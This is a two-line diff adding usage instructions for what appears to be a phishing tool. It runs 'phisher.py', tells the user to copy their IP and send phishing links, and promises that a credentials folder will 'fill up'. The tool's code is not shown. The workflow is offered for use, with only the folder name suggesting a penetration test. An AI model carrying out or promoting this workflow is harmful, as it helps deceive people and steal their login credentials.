@@ -1,0 +1,2 @@
+python3 phisher.py
+# Copy YOUR_IP → Send phishing links → Watch ./PENTEST_CREDS/ fill up!
